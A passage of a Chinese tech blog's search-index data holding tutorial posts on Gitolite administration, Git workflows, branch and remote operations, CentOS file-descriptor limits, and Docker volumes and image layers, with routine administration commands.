Gitolite 管理示例 - 添加、修改仓库 12345678910111213141516171819202122232425262728293031# 查看当前用户身份，确保当前用户身份是Root用户# whoami# 进入gitolite-admin仓库所在的目录# cd /root/gitolite-admin# 编辑Gitolite的配置文件，使用以下格式配置用户、用户组、仓库、权限等# vim conf/gitolite.conf# 配置用户组，组成员名称必须与keydir目录下的SSH公钥文件的文件名相同@组名 = 用户名# 配置仓库名/项目名，如果对应的仓库不存在，执行Push操作之后会自动创建并初始化仓库repo demo# 配置仓库权限，如果是多个用户组/用户名，则使用空格隔开RW+ = @用户组/用户名# 如果在Gitolite的配置文件中添加了新客户端用户的配置内容，则需要上传新客户端用户的SSH公钥文件到gitolite-admin/keydir目录下。在keydir目录下，客户端用户的SSH公钥文件的文件名必须与conf/gitolite.conf文件中指定的客户端用户名一致；例如用户zhangsan，其SSH公钥文件的文件名必须是zhangsan.pub。这里的作用类似在Linux中配置SSH免密码登录。# 配置仓库签名（只需在首次执行Push操作之前进行配置）# git config user.name gitolite-root# git config user.email xxx@qq.com# 执行Push操作，使配置生效# git add --all# git commit -am \'update gitolite config\'# git push origin master# 如果上述配置中包含了新仓库的配置内容，那么成功执行Push操作之后，可以在/home/git/repositories目录下看到新创建的仓库目录，例如demo.git# ls -al /home/git/repositories Gitolite 管理示例 - 删除仓库 12345678910111213141516# 查看当前用户身份，确保当前用户身份是Root用户# whoami# 进入gitolite-admin仓库所在的目录# cd /root/gitolite-admin# 编辑Gitolite的配置文件，删除对应仓库的相关配置内容，例如“repo demo”# vim conf/gitolite.conf# 执行Push操作# git add --all# git commit -am \'update gitolite config\'# git push origin master# 在服务器上手动删除/home/git/repositories目录下对应的仓库目录，删除示例如下：# rm -rf /home/git/repositories/demo Git 客户端（远程客户端）连接 Gitolite 服务器的步骤总结 Git 管理员在 gitolite-admin 仓库里，配置客户端用户访问对应仓库的权限 客户端本地生成 SSH 公钥文件，并交由 Git 管理员上传到 gitolite-admin/keydir 目录下 客户端直接使用 Git 命令克隆对应的远程仓库，例如： git clone git@ip:repo-name 其他 IDE (例如 Eclipse) 克隆对应的远程仓库，可以直接使用地址： git@ip:repo-name git@ip:repo-name，其中 ip 是 Gitolite 服务器的 IP 地址，repo-name 是 Git 远程仓库的名称 Gitolite 防火墙配置说明 使用 Gitolite 搭建 Git 服务器，由于 Gitolite 采用的是 SSH 协议，只需要确保系统开启 SSH 服务，并且防火墙开放了 SSH 端口（默认 22）即可。 解决 Gitolite 安装之后，无法使用 git 用户进行 SSH 远程登录的问题 当安装 Gitolite 后，Gitolite 出于安全问题直接禁用了 git 用户的 SSH 登录权限，因此是无法直接使用 git 用户远程 SSH 连接到服务器的，默认会提示以下错误信息。解决方法是先通过其他 Linux 用户 SSH 远程连接到服务器，然后执行命令”su - git” 切换到 git 用户。 123# ssh git@192.168.1.1PTY allocation request failed on channel 0hello centos7, this is git@192.168.1.1 running gitolite3 v3.6.10-2-g64aa53b on git 1.8.3.1 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux 版本控制"},{title:"Git 之五 - 深入理解 Git 工作流",url:"/posts/1600ad43.html",text:'Git 工作流概念Git 工作流指在项目开发过程中使用 Git 的方式，包括集中式工作流、功能分支工作流、GitFlow 工作流、Forking 工作流、Pull Requests。 Git 工作流分类集中式工作流像 Subversion 一样，集中式工作流以中央仓库作为项目所有修改的单点实体。所有修改都提交到 Master 这个分支上，这种方式与 SVN 的主要区别就是开发人员有本地库，但 Git 很多特性并没有使用到。 功能分支工作流功能分支工作流以集中式工作流为基础，不同的是为各个新功能分配一个专门的分支来开发。这样可以在把新功能集成到正式项目前，用 Pull Requests 的方式讨论变更。 Gitflow 工作流Gitflow 工作流通过为功能开发、发布准备和维护设立了独立的分支，让发布迭代过程更流畅。严格的分支模型也为大型项目提供了一些非常必要的结构。 Forking 工作流Forking 工作流是在 GitFlow 基础上，充分利用了 Git 在分支和克隆上的优势、Git 的 Fork 和 Pull Request 功能，实现代码审核的目的。可以安全可靠地管理大团队的开发者（developer），并能接受不信任贡献者（contributor）的提交。 Pull RequestsPull Requests 是 Bitbucket 提供的让开发者更方便地进行协作的功能，提供了友好的 Web 界面可以在提议的修改合并到正式项目之前对修改进行讨论。 GitFlow 工作流中分支类型详解 主干分支（master） 主要负责管理正在运行的生产环境代码，永远保持与正在运行的生产环境完全一致。 Bug 修复分支（hotfix） 主要负责管理生产环境下需要紧急修复的代码。从主干分支分出，修理完毕并测试上线后，并回主干分支。并回后，视情况可以删除该分支。 准生产分支（release） 较大的版本上线前，会从开发分支中分出准生产分支（预发布分支），进行最后阶段的集成测试。该版本上线后，会合并到主干分支。生产环境运行一段阶段较稳定后可以视情况删除。 开发分支（develop） 主要负责管理正在开发过程中的代码，一般情况下应该是最新的代码。 功能分支（feature） 为了不影响较短周期的开发工作，一般把中长期开发模块，会从开发分支中独立出来，开发完成后会合并到开发分支。 分支详细图解 Git 提交规范 feat 增加新功能 fix 修复问题 / BUG style 代码风格相关无影响运行结果的 perf 优化 / 性能提升 refactor 重构 revert 撤销修改 test 测试相关 docs 文档 / 注释 build 对构建系统或者外部依赖项进行了修改 chore 依赖更新 / 脚手架配置修改等 workflow 工作流改进 ci 持续集成 types 类型定义文件更改 wip 开发中 参考博客 深入理解学习 Git 工作流（git-workflow-tutorial） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"版本控制"},{title:"开发帮助文档整理",url:"/posts/d4da5eed.html",text:'Git Git 资料整理 Pro Git Book C++ C++ 帮助手册 C/C++ 参考手册 Docker 菜鸟教程 - Docker 命令大全 Kubernetes 中文指南 / 云原生应用架构实践手册 Docker — 从入门到实践：VuePress、GitBook、看云 Jenkins Jenkins 官方英文文档 Jenkins 官方中文文档 Jenkins W3School 中文文档 Apache Ignite Apache Ignite 官方英文文档 Apache Ignite 中文文档 MyBatis MyBatis 3 官方中文文档 MyBatis-Plus 2.x 官方中文文档 MyBatis-Plus 3.x 官方中文文档 IntelliJ IDEA IntelliJ IDEA 官方英文文档 Gradle Gradle 官方英文文档 Gradle W3School 中文教程 Puppeteer Puppeteer 官方中文文档 Redis Redis 命令参考 Redis 命令使用手册 Reids 菜鸟教程文档 Spring Spring 官方中文文档 Spring Cloud Spring Cloud Dalston 中文文档 Spring Cloud Greenwich 中文文档 ECMAScript ES6 入门教程（阮一峰） ElasticSearch ElasticSearch 官方英文文档 ElasticSearch 官方英文手册 ElasticSearch 非官方中文文档 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发随笔"},{title:"Centos7 更改最大打开文件描述符数",url:"/posts/88a10b.html",text:'系统环境 12CentOS Linux release 7.6.1810 (Core)Linux 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 临时更改最大打开文件描述符数 12345# 查看限制# ulimit -n# 临时更改限制（系统重启失效）# ulimit -n 1048576 永久更改最大打开文件描述符数 1234567891011121314151617181920# 第一步# vim /etc/security/limits.conf* soft nofile 1048576* hard nofile 1048576 #星号表示对所有用户生效# 第二步# vim /etc/sysctl.conffs.file-max = 1048576 #可执行"sysctl -p"使fs.file-max生效# 第三步# vim /etc/pam.d/loginsession required pam_limits.so #查看配置文件有没有这行，没有就加上# 第四步# reboot #重启系统# 第五步（查看是否生效）# ulimit -n# sysctl fs.file-max# cat /proc/PID/limits #PID是应用的进程ID，在输出结果中查看"Max open files"的显示值 更改 Supervisor 的最大打开文件描述符数 1234567891011121314# 如果应用使用supervisor来管理，则需要按以下步骤配置，否则上面的配置对使用supervisor管理的应用不生效# 修改supervisor的配置文件# vim /etc/supervisord.confminfds=1048576# 修改supervisor的systemctl启动脚本，添加LimitNOFILE属性# vim /usr/lib/systemd/system/supervisord.service[Service]LimitNOFILE=1048576# 重启supervisord生效# systemctl daemon-reload# systemctl restart supervisord 更改 MySQL（RPM 方式安装）的最大打开文件描述符数 12345678910111213141516171819# 如果是通过yum源或者rpm包的方式安装mysql，那么上面的配置对mysql无效，因为systemctl启动脚本覆盖了ulimit配置# 查看mysql的最大打开文件描述符数# cat /proc/`pidof mysqld`/limits# egrep \'^(Limit|Max open files)\' /proc/`pidof mysqld`/limits# 第一种方法：直接修改mysql的systemctl启动脚本（不建议修改mysqld.service，这样会影响下次升级）# vim /usr/lib/systemd/system/mysqld.serviceLimitNOFILE=1048576# 第二种方法：完美解决升级问题# mkdir /usr/lib/systemd/system/mysqld.service.d# vim /usr/lib/systemd/system/mysqld.service.d/override.conf[Service]LimitNOFILE=1048576# 重启mysql生效# systemctl daemon-reload# systemctl restart mysqld var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Git 之四 - Git 对 Github 远程库的操作",url:"/posts/a288950b.html",text:'Git 的四个工作区域 创建远程库与本地库12345# 登录Github的Web页面创建远程库，并记录如下的远程库地址# https://github.com/xxxx/remote-test.git# 创建本地库，建议本地库的名称与远程库的名称一致$ git init remote-test Git 配置远程库别名1234567891011121314# 进入本地库的根目录$ cd remote-test# 查看远程库别名$ git remote -v# 添加远程库别名，例如下面远程库的别名是origin，地址是Github远程仓库的Https URL$ git remote add origin https://github.com/xxxx/remote-test.git# 删除远程库别名$ git remote rm origin# 重命名远程库别名$ git remote rename origin origin2 Git 远程库的 Pull 与 Push 操作1234567891011121314151617# 进入本地库的根目录$ cd remote-test# 从远程库origin的master分支Pull（拉取）最新到工作区，并在工作区进行合并(Merge)操作，origin是远程库别名，master是远程库分支的名称$ git pull origin master# 创建新文件$ touch api.json# 添加新文件到暂存区$ git add api.json# 添加新文件到本地库$ git commit api.json -m \'update\'# 将最新的文件Push（推送）到远程库origin的master分支，origin是远程库别名，master是远程库分支的名称；如果Pull到Github的远程仓库（Https URL），默认会提示输入Github的帐号和密码$ git push origin master Git 远程库的 Clone 操作12345678910# 将远程库Clone到本地，默认分支是master$ git clone https://github.com/xxxx/remote-test.git# 或者Clone远程库到本地，并指定本地目录的名称，默认分支是master$ git clone https://github.com/xxxx/remote-test.git remote-project# 上述命令的作用：# 初始化本地库，即执行"git init"命令# 完整地把远程库的master分支Pull下来，即执行"git pull"命令# 创建远程库别名（origin + 远程库地址），即执行"git remote add"命令 Git 远程库的 Fetch 操作12345678910111213141516# 首次执行会创建本地库origin的master分支（origin/master），然后从远程库origin的master分支Fetch（抓取）最新到本地库origin的master分支（origin/master），不影响当前工作区的内容$ git fetch origin master# 查看本地库的master分支与本地库origin的master分支（origin/master）的差异$ git diff master origin/master# 或者$ git diff HEAD FETCH_HEAD# 合并本地库origin的master分支（origin/master）到本地库的master分支$ git merge origin/master# 或者$ git merge FETCH_HEAD# 指令Pull与Fetch的区别： Pull = Fetch + Merge 解决 Pull 操作产生的冲突Pull = Fetch + Merge，也就是说根本问题是 “如何解决合并分支后产生的冲突” 12345678910111213141516# 从远程库origin的master分支Pull（拉取）最新到工作区，并在工作区进行合并(Merge)操作，假设此时Git提示有文件产生冲突# git pull origin master# 第一步，手动编辑产生冲突的文件，并修改文件内容，直至冲突的文件内容都修改掉$ vim api.json&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEADedit by hot_fix s=======edit by hot_fix2&gt;&gt;&gt;&gt;&gt;&gt;&gt; master# 第二步，标记冲突已解决，将之前产生冲突的文件添加到暂存区$ git add api.json# 第三步，提交修改，此时commit参数不能带具体文件名$ git commit -m \'update message\' 解决 Push 失败的问题如果不是基于远程库的最新版本所做的修改，不能进行 Push 操作，必须先将远程库最新版本的文件 Pull 下来再进行 Push 操作。Pull 下来之后如果文件产生冲突，则按照上面” 解决 Pull 操作产生的冲突” 的步骤进行操作。 Git 远程库的分支创建操作1234567891011121314# 本地创建分支$ git branch develop# 本地切换到指定分支$ git checkout develop# 将分支代码添加到暂存区$ git add --all# 将分支代码提交到本地库$ git commit -am \'create branch develop\'# 将分支代码Push到远程库的分支，此时远程库会自动创建分支$ git push origin develop SSH 免密码登录 Github当远程库的地址是基于 HTTPS 协议的时候，每次 Push 操作都需要手动输入 Github 的用户名和密码；Windows 系统下会自动保存凭据（帐号信息），可以避免每次都手动输入帐号信息；而 Linux 下则没有自动保存凭据的功能，因此 Github 官方提供了基于 SSH 免密码登录的方式进行 Push 操作，以此来解决每次都要输入帐号信息的问题；SSH 免密码登录的方式同样适用于 Windows 系统，此方法的局限性在于本地只能操作一个 Github 帐号。 12345678910111213141516171819202122$ cd ~/.ssh# 生成SSH的公钥文件id_rsa.pub与私钥文件id_rsa，并指定邮箱地址$ ssh-keygen -t rsa -C xxxx@gmail.com# 或者指定公钥和私钥文件的文件名$ ssh-keygen -t rsa -C xxxx@gmail.com -f id_rsa.github# 将公钥文件id_rsa.pub的文本内容复制到Github相应的SSH Keys配置页面$ cat id_rsa.pub# 进入本地库的根目录$ cd remote-test# 删除旧的远程库别名$ git remote rm origin# 添加新的远程库别名，远程库的地址基于SSH协议$ git remote add origin git@github.com:xxxx/remote-test.git# 测试使用“SSH免密码登录”的方式进行Push操作$ git push origin master Github Fork 的项目和上游项目同步代码当成功 Fork 一个项目后，无论怎么修改 Fork 出来的项目，原来的项目（Github 叫做 upstream，一般译作上游项目）是不会受到影响的，这在上游项目来说自然是极好的保护。但是 Fork 出来的项目如何能够及时反映上游项目的变更呢？这就首先需要设置本地项目的 “远程仓库” 属性，即告诉 Git 命令，本地项目的上游项目是哪一个，比如下面针对 weld-core 项目举例。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# 设置上游的远程仓库$ git remote add upstream https://github.com/weld/core# 查看所有远程仓库$ git remote -vorigin https://github.com/subaochen/core.git (fetch)origin https://github.com/subaochen/core.git (push)upstream https://github.com/weld/core (fetch)upstream https://github.com/weld/core (push)# 将上游远程仓库的最新变化同步到本地$ git fetch upstream# 查看当前项目的所有分支$ git branch -a* 2.0 remotes/origin/1.1 remotes/origin/1.2 remotes/origin/2.0 remotes/origin/2.0.0 remotes/origin/2.0.0.Beta5-branch remotes/origin/HEAD -&amp;gt; origin/2.0 remotes/origin/master remotes/upstream/1.1 remotes/upstream/1.2 remotes/upstream/2.0 remotes/upstream/2.0.0 remotes/upstream/2.0.0.Beta5-branch remotes/upstream/2.1 remotes/upstream/2.2 remotes/upstream/2.2.0 remotes/upstream/2.3 remotes/upstream/eap6.2.x remotes/upstream/master remotes/upstream/weld-osgi-2.x# 确保本地代码的分支设置得当，一般设置为 origin/master$ git checkout origin/master# 合并上游远程仓库和本地仓库的代码（即将分支 origin/master 与 upstream/master 合并在一起）$ git merge upstream/master# 提交本地变更，Push 代码到 origin/master$ git push origin master# 其实同步上游远程仓库代码的步骤，可以合并成一条命令，该命令相当于上面的：fetch + merge# 第一个参数 pustream 表示远程仓库的 upstram/master 分支# 第二个参数 master 表示本地 Fork 库的 origin/master 分支$ git pull upstream master Git 从远程仓库获取特定分支12345678910# 列出远程仓库的所有分支$ git branch -aremotes/origin/devremotes/origin/release# 拉取特定的远程分支，例如checkout远程的origin/dev分支，并在本地将其命名为dev分支，同时切换到本地的dev分支$ git checkout -b dev origin/dev# 切换回master分支$ git checkout master 清空 Github 特定的仓库清空 Github 特定的仓库，而不是删除并重新创建仓库，同时保留本地仓库原来的所有文件。 12345678910111213141516171819# 创建临时的仓库目录（保证不对本地仓库原来的文件进行任何操作）$ mkdir -p /tmp/reset-repo# 进入临时仓库目录$ /tmp/reset-repo# 创建README.md（必须得有一个文件）$ touch README.md# 初始化Git$ git init$ git add .$ git commit -m "Initial commit"# 重新设置源仓库的地址$ git remote add origin git@github.com:&lt;YOUR ACCOUNT&gt;/&lt;YOUR REPOS&gt;.git# 重新Push到源仓库（这里演示使用的是master分支）$ git push -u --force origin master .gitignore 常用模板 .gitignore 常用模板 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"版本控制"},{title:"Git 之三 - 分支管理",url:"/posts/501d8c1.html",text:'Git 常见的分支模型 Git 分支管理图解 Git 分支的创建、删除、切换 1234567891011121314# 查看当前的分支列表$ git branch -v# 创建分支$ git branch hot_fix# 删除某个分支$ git branch -d hot_fix# 切换到某个分支$ git checkout hot_fix# 一步完成创建并切换分支$ git checkout -b hot_fix Git 分支的合并 1234567# 演示将hot_fix分支合并到master分支# 第一步，切换到接收修改的分支（即准备增加新内容的分支）上$ git checkout master# 第二步，合并分支$ git merge hot_fix Git 解决合并分支后产生的冲突 123456789101112131415161718192021# 演示将master分支合并到hot_fix分支，并解决合并后产生的冲突# 切换到hot_fix分支$ git checkout hot_fix# 合并master分支，git输出了合并冲突的提示信息$ git merge master&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEADedit by hot_fix s=======edit by hot_fix2&gt;&gt;&gt;&gt;&gt;&gt;&gt; master# 第一步，手动编辑产生冲突的文件，并修改文件内容，直至冲突的文件内容都修改掉$ vim api.json# 第二步，标记冲突已解决，将之前产生冲突的文件添加到暂存区$ git add api.json# 第三步，提交修改，此时commit参数不能带具体文件名$ git commit -m \'update message\' 克隆指定分支的代码 12# 通过 -b 参数指定分支，默认是master分支$ git clone -b develop https://github.com/xxx.git var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"版本控制"},{title:"Docker 之五 Docker 数据卷与数据卷容器",url:"/posts/ab1aba7d.html",text:'前言 容器在运行期间产生的数据不会写在镜像里面，重新用此镜像创建并启动新的容器就会初始化镜像，加一个全新的容器可写层来保存数据。生产环境中使用 Docker 的过程中，往往需要对数据进行持久化，或者需要在多个容器之间进行数据共享，Docker 提供数据卷和数据卷容器来解决；另外还可以通过 commit 提交一个新的镜像来保存产生的数据，也可以通过 “docker cp” 命令在宿主机与容器之间互相拷贝数据文件。 容器中管理数据主要的两种方式 数据卷（Data Volumes）：容器内数据直接映射到本地主机环境。数据卷容器（Data Volume Containers）：使用特定容器维护数据卷。 数据卷的功能介绍 绕过 “写时复制” 系统，以达到本地磁盘 IO 的性能。 绕过 “写时复制” 系统，有些文件不需要在 docker commit 打包进镜像文件。 实现容器内部数据的持久化。 数据卷可以在容器间共享和重用数据。 数据卷可以在宿主机和容器间共享数据。 数据卷数据改变是直接修改的。 数据卷是持续性的，直到没有容器使用它们；即便是初始的数据卷容器或中间层的数据卷容器删除了，只要还有其他的容器使用数据卷，那么里面的数据都不会丢失。 Docker 通过命令的方式添加数据卷 1234567891011# 创建宿主机的文件共享目录，即使不手动在宿主机上创建数据卷目录，Docker也会自动创建# mkdir -p /host/datavolume# 为容器添加一个数据卷，即将宿主机的/host/datavolume目录挂载到容器中的/datavolume目录，容器默认具有/datavolume目录的读写权限，以下命令的作用类似Linux的mount命令# docker run -it -v /host/datavolume:/datavolume --name="cenots7" centos# 为容器添加一个数据卷，同时指定容器仅拥有/datavolume目录的只读权限# docker run -it -v /host/datavolume:/datavolume:ro --name="cenots7" centos# 查看数据卷的创建情况# docker inspect cenots7 Docker 通过编写 Dockerfile 的方式添加数据卷 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# 创建Dockerfile文件，并添加以下文件内容# vi ~/dockerfileFROM centosVOLUME ["/dataVolume1","//dataVolume2"]CMD /bin/bash# 通过dockerfile文件构建新的Docker镜像，peter是命名空间，centos7是新镜像的名称# docker build -f ~/dockerfile -t peter/centos7 .# 查看刚构建的Docker镜像# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEpeter/centos7 latest e6d3ad991247 50 seconds ago 202MB# 基于刚构建的Docker镜像，新建并启动容器# docker run -it --name="centos7" peter/centos7# 查看容器内通过dockerfile添加的容器卷# ls -al /drwxr-xr-x 2 root root 6 Dec 31 11:15 dataVolume1drwxr-xr-x 2 root root 6 Dec 31 11:15 dataVolume2# 查看宿主机中数据卷的挂载目录，该挂载目录由Docker分配# docker inspect centos7"Mounts": [ { "Type": "volume", "Name": "b6c0574c8e2105ebb736857f050d106dd4d3b35617c40110b69d85c22c900de1", "Source": "/var/lib/docker/volumes/b6c0574c8e2105ebb736857f050d106dd4d3b35617c40110b69d85c22c900de1/_data", "Destination": "/dataVolume2", "Driver": "local", "Mode": "", "RW": true, "Propagation": "" }, { "Type": "volume", "Name": "0ad49fc76fc6af73ebc62efc88c3976cb44edd1b48aed3d26995e7759044972a", "Source": "/var/lib/docker/volumes/0ad49fc76fc6af73ebc62efc88c3976cb44edd1b48aed3d26995e7759044972a/_data", "Destination": "/dataVolume1", "Driver": "local", "Mode": "", "RW": true, "Propagation": "" }] Docker 数据卷容器的使用 容器之间配置信息的传递，数据卷的生命周期一直持续到没有容器使用它为止；即便是初始的数据卷容器或中间层的数据卷容器删除了，只要还有其他的容器使用数据卷，那么里面的数据都不会丢失。 12345678910111213141516171819# 首先创建Dockerfile文件# vi ~/dockerfileFROM centosVOLUME ["/dataVolume1","/dataVolume2"]CMD /bin/bash# 通过Dockerfile文件构建新的Docker镜像# docker build -f ~/dockerfile -t peter/centos7 .# 基于刚构建的Docker镜像，新建并启动容器# docker run -it --name="centos-1" peter/centos7# 基于上面的centos-1容器，再创建另一个容器centos-2，同时指定centos-1容器作为数据卷容器# docker run -it --name="centos-2" --volumes-from centos-1 peter/centos7# 查看centos-2容器内的容器卷# ls -al /drwxr-xr-x 2 root root 6 Dec 31 11:15 dataVolume1drwxr-xr-x 2 root root 6 Dec 31 11:15 dataVolume2 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"Docker 之四 Docker 镜像结构与加载原理",url:"/posts/eb291124.html",text:'Docker 镜像 镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，包含运行某个软件所需的所有内容，其中包括代码、运行时、库、环境变量、配置文件。 Docker 的 Base 镜像 Base 镜像从 scratch 构建，不依赖其他镜像，可作为其他应用镜像的父镜像；其他应用镜像可以在此基础进行扩展，Base 镜像通常都是各种 Linux 发行版的 Docker 镜像，比如 Ubuntu、Debian、CentOS 等。 Docker 镜像加载原理 bootfs 在 Docker 镜像中最底层是 bootfs (boot file sysem) 文件系统，bootfs 主要包含 bootloader 和 kernel。Linux 刚启动时会加载 bootfs 文件系统，bootlader 主要作用是引导加载 kernel。在 Docker 镜像中，bootfs 这一层与典型的 Linux/Unix 系统是一样的，包含 bootloader 和 kernel。当 bootloader 加载完成之后整个内核都存放在内存中，此时内存的使用权已由 bootfs 转交给内核，此时系统也会卸载 bootfs。 rootfs 在 Docker 镜像中用户空间的文件系统是 rootfs，包含 /dev、/proc、/bin 等目录。对于 base 镜像来说，底层直接用 Host 的 kernel，自己只需要提供 rootfs。而对于一个精简的 OS，rootfs 的体积可以很小，只需要包含最基本的命令、工具和程序库就可以。 不同 Linux 发行版的主要区别就是 rootfs。比如 Ubuntu14.04 使用 upstart 管理服务，apt 管理软件包；而 CentOS7 使用 systemd 和 yum。这些都是用户空间上的区别，Linux kernel 差别不大。因此 Docker 可以同时支持多种发行版的 Linux 镜像，模拟出多种操作系统环境。 容器只能使用 Host 的 kernel，并且不能修改。所有容器都共用 host 的 kernel，在容器中没办法对 kernel 升级。如果容器对 kernel 版本有要求（比如应用只能在某个 kernel 版本下运行），则不建议用容器，这种场景虚拟机可能更合适。 图解 bootfs、rootfs UnionFS 文件系统 一种为 Linux，FreeBSD 和 NetBSD 操作系统设计的把其他文件系统联合到一个联合挂载点的文件系统服务。它使用 branch 把不同文件系统的文件和目录 “透明地” 覆盖，形成一个单一一致的文件系统。这些 branches 或者是 read-only 或者是 read-write 的，所以当对这个虚拟后的联合文件系统进行写操作的时候，系统是真正写到了一个新的文件中。看起来这个虚拟后的联合文件系统是可以对任何文件进行操作的，但是其实它并没有改变原来的文件，这是因为 unionfs 用到了一个重要的资管管理技术叫写时复制。写时复制（copy-on-write）技术，也叫隐式共享，是一种对可修改资源实现高效复制的资源管理技术。它的思想是，如果一个资源是重复的，但没有任何修改，这时候并不需要立即创建一个新的资源；这个资源可以被新旧实例共享。创建新资源发生在第一次写操作，也就是对资源进行修改的时候。通过这种资源共享的方式，可以显著地减少未修改资源复制带来的消耗，但是也会在进行资源修改的时候增加小部分的开销。 Docker 镜像中的 UnionFS UnionFS 文件系统是 Docker 镜像的基础，镜像可以通过分层来进行继承，基于 Base 镜像（没有父镜像），可以制作各种具体的应用镜像。简单概括来说，UnionFS 是一种分层、轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层地叠加，同时可以将不同目录挂载到同一个虚拟文件系统下。特性是可以一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统；联合加载会把各层文件系统叠加起来，这样最终的文件系统包含所有底层的文件和目录。 容器的可写层 当容器启动时，一个新的可写层被加载到镜像的顶部。这一层通常被称作 “容器层”，“容器层” 之下的都叫 “镜像层”。所有对容器的改动，无论添加、删除、还是修改文件都只会发生在容器层中。即只有容器层是可写的，容器层下面的所有镜像层都是只读的。其中镜像层数量可能会很多，所有镜像层会联合在一起组成一个统一的文件系统（UnionFS）。如果不同镜像层中有一个相同路径的文件，比如 /a，上层的 /a 会覆盖下层的 /a，也就是说用户只能访问到最上层中的文件 /a。在容器层中，用户看到的是一个叠加之后的文件系统。下图是容器可写层的图解： 容器可写层的操作 添加文件，在容器中创建文件时，新文件被添加到容器层中。 读取文件，在容器中读取某个文件时，Docker 会从上往下依次在各镜像层中查找此文件。一旦找到，打开并读入内存。 修改文件，在容器中修改已存在的文件时，Docker 会从上往下依次在各镜像层中查找此文件。一旦找到，立即将其复制到容器层，然后再修改。 删除文件，在容器中删除文件时，Docker 也是从上往下依次在镜像层中查找此文件。找到后，会在容器层中记录下此删除操作。 